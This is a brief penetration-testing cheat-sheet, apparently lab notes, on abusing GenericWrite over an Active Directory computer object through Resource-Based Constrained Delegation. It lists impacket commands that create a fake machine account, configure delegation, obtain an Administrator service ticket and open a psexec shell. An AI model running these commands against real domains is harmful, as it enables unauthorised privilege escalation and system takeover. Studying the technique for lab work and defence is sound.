# Generic write

## Resource-Based Constrained Delegation (RBCD)

### Overview

If we have **GenericWrite** over a computer object in AD, we can abuse Resource-Based Constrained Delegation to impersonate privileged users (e.g., Administrator) against that target.

**Requirements:**

* GenericWrite/GenericAll over the target computer object
* Ability to create a machine account (by default, users can create up to 10)

**Attack flow:**

1. Create a fake machine account that we control
2. Configure RBCD: allow our machine account to delegate to the target
3. Use S4U2Proxy to obtain a TGS as Administrator

### Steps

#### 1. Clear previous tickets (if necessary)

bash

```bash
rm -f *.ccache
unset KRB5CCNAME
```

#### 2. Create fake machine account

bash

```bash
addcomputer.py -computer-name 'fakeMachine$' -computer-pass 'Password123' -dc-ip <DC_IP> '<DOMAIN>/<USER>'
```

#### 3. Configure RBCD (write delegation)

bash

```bash
impacket-rbcd -delegate-to '<TARGET$>' -delegate-from 'fakeMachine$' -dc-ip <DC_IP> -action write '<DOMAIN>/<USER>:<PASSWORD>'
```

#### 4. Verify delegation (optional)

bash

```bash
impacket-rbcd -delegate-to '<TARGET$>' -delegate-from 'fakeMachine$' -dc-ip <DC_IP> -action read '<DOMAIN>/<USER>:<PASSWORD>'
```

#### 5. Obtain TGS impersonating Administrator

bash

```bash
impacket-getST -spn cifs/<TARGET_FQDN> -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/fakeMachine$:Password123'
```

#### 6. Use the ticket

bash

```bash
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <TARGET_FQDN>
```

***

**Note:** The SPN must match the target's FQDN (e.g., `cifs/dc.domain.htb`).
